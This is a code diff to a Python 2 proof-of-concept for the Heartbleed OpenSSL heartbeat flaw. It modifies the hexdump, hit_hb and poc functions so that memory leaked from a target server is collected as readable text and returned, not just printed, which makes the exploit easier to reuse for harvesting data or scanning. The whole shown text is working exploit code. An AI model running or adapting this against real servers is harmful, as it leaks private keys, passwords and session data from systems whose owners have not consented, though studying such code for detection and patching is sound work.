@@ -39,12 +39,14 @@ hb = h2bin('''
 ''')
 
 def hexdump(s):
+    pdat = ''
     for b in xrange(0, len(s), 16):
         lin = [c for c in s[b : b + 16]]
-        hxdat = ' '.join('%02X' % ord(c) for c in lin)
-        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
-        print '  %04x: %-48s %s' % (b, hxdat, pdat)
-    print
+        pdat += ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
+ 
+    s =  '%s' % (pdat.replace('......', ''),)
+    print s
+    return s
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
@@ -82,18 +84,21 @@ def hit_hb(s):
     s.send(hb)
     while True:
         typ, ver, pay = recvmsg(s)
+        #print pay
         if typ is None:
             print 'No heartbeat response received, server likely not vulnerable'
             return False
 
         if typ == 24:
             print 'Received heartbeat response:'
-            hexdump(pay)
+            res = hexdump(pay)
             if len(pay) > 3:
                 print 'WARNING: server returned more data than it should - server is vulnerable!'
+                #print res
+                return res
             else:
                 print 'Server processed malformed heartbeat, but did not return any extra data.'
-            return True
+                return False
 
         if typ == 21:
             print 'Received alert:'
@@ -120,7 +125,7 @@ def poc(host):
             typ, ver, pay = recvmsg(s)
             if typ == None:
                 print 'Server closed connection without sending Server Hello.'
-                return
+                return False
             # Look for server hello done message.
             if typ == 22 and ord(pay[0]) == 0x0E:
                 break
@@ -128,7 +133,11 @@ def poc(host):
         print 'Sending heartbeat request...'
         sys.stdout.flush()
         s.send(hb)
-        hit_hb(s)
+        res = hit_hb(s)
+        if res:
+            return 'The Server is vulnerable'
+        else:
+            return False
     except:
         return False
 
